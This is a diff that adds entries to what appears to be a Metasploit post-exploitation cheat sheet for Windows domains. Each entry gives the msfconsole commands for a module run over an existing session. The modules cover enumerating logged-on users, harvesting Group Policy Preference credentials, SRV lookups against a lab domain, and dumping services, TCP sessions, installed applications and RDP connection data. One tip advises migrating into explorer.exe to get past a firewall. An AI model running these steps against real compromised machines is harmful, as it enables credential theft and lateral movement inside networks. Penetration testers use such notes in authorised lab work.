@@ -75,3 +75,67 @@ msf post(delete_user) > set session 1
 msf post(delete_user) > exploit
 
 -------------------------------------------
+Enumerate all logged on users
+ This module will enumerate current and recently logged on Windows users.
+
+msf > use post/windows/gather/enum_logged_on_users
+
+msf post(enum_logged_on_users) > set session 1
+
+msf post(enum_logged_on_users) > exploit
+---------------------------------------------------------------------------
+Gather All Group Policy Preference 
+msf > use post/windows/gather/credentials/gpp
+
+msf post(gpp) > set session 1
+
+msf post(gpp) > exploit
+----------------------------------------------------
+Find All DNS Service Records
+Enumerates know SRV Records for a given domain using target host DNS query tool.
+
+msf > use post/multi/gather/dns_srv_lookup
+
+msf post(dns_srv_lookup) > set domain rajlab.com
+
+msf post(dns_srv_lookup) > set session 1
+
+msf post(dns_srv_lookup) > exploit
+--------------------------------------------------------
+Find All Services in Server
+NOTE: If the script hangs, windows firewall is most likely on and you did not migrate to a safe process (explorer.exe for example)
+
+msf > use post/windows/gather/enum_services
+
+msf post(enum_services) > set session 1
+
+msf post(enum_services) > exploit
+-------------------------------------------------
+Find All Active Directory TCP sessions
+ This Module lists current TCP sessions.
+
+msf > use post/windows/gather/tcpnetstat
+
+msf post(tcpnetstat) > set session 1
+
+msf post(tcpnetstat) > exploit
+-------------------------------------------------------
+Find All Installed Application in Server
+ This module will enumerate all installed applications
+
+msf > use post/windows/gather/enum_applications
+
+msf post(enum_applications) > set session 1
+
+msf post(enum_applications) > exploit
+
+---------------------------------------------------------
+
+Find All Remote Desktop Session
+ This module dumps MRU and connection data for RDP sessions.
+
+msf > use post/windows/gather/enum_termserv 
+
+msf post(enum_termserv) > set session 1
+
+msf post(enum_termserv) > exploit
